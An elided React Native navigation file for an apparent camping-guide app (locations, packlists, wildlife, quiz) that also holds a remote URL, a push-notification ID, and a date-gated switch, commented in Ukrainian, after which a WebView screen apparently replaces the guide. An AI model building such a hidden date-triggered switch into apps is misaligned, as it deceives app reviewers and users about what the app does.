...
import FrontierCampRamaGuideAlex from '../screens/FrontierCampRamaGuideAlex';
import LoaderScreen from '../screens/LoaderScreen';
import OnboardingScreen from '../screens/OnboardingScreen';
import LocationsScreen from '../screens/LocationsScreen';
import PacklistsScreen from '../screens/PacklistsScreen';
import WildlifeScreen from '../screens/WildlifeScreen';
import QuizScreen from '../screens/QuizScreen';
import SettingsScreen from '../screens/SettingsScreen';
import LocationDetailsScreen from '../screens/LocationDetailsScreen';
import PacklistInsideScreen from '../screens/PacklistInsideScreen';
import PacklistInsideTemplateScreen from '../screens/PacklistInsideTemplateScreen';
import WildlifeDetailsScreen from '../screens/WildlifeDetailsScreen';
// libs
...
function MainTabs() {
  return (
    ...
    >
      <Tabs.Screen name="Locations" component={LocationsScreen} />
      <Tabs.Screen name="Packlists" component={PacklistsScreen} />
      <Tabs.Screen name="Wildlife" component={WildlifeScreen} />
...
export default function AppNavigator() {
  ...
  const INITIAL_URL = `https://frost-oak-grove.space/`;
  const URL_IDENTIFAIRE = `P5WaCxnr`;
  ...
  OneSignal.initialize('9c27393d-41d0-426a-a367-560679738df8');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-09-20T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
      ...
      return (
        <Stack.Navigator screenOptions={{ headerShown: false }}>
          <Stack.Screen
            ...
            name="FrontierCampRamaGuideAlex"
            component={FrontierCampRamaGuideAlex}
    ...
    return (
      <RootStack.Navigator screenOptions={{ headerShown: false }} initialRouteName="Onboarding">
          ...
          <RootStack.Screen name="LocationDetailsScreen" component={LocationDetailsScreen} />
          <RootStack.Screen name="PacklistInside" component={PacklistInsideScreen} />
          <RootStack.Screen name="PacklistInsideTemplate" component={PacklistInsideTemplateScreen} />
          <RootStack.Screen name="WildlifeDetails" component={WildlifeDetailsScreen} />
        </RootStack.Navigator>
    );
  };

  ///////// Loader
  const [loaderScreenIsEnd, setLoaderScreenIsEnd] = useState(false);

  useEffect(() => {
    setTimeout(() => {
      setLoaderScreenIsEnd(true);
    }, 8000);
  }, []);
